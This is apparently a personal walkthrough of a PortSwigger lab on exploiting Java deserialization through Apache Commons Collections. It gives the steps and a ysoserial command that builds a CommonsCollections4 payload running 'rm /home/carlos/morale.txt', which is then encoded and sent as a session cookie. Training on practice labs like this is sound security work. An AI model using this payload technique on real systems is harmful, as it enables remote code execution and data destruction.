

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons
This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter


1) access as wiener:perter and see that the session cookie is a serialized object in JAVA (look at the base64 decoding)

2) we can create a malicious serialized java object using ysoserial that is used to serialize objects
    download it from https://github.com/frohoff/ysoserial/releases

    INSTALL JAVA 11
    
    sudo apt-get install openjdk-11-jdk

3) create the serialized object using java11 (with higher version it doesn't work

    PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > base.txt

    now we have the serialized object into the base.txt file

4) we have to use it as session cookie BUT FIRST URL ENCODE
    URL ENCODED cookie works
    
    
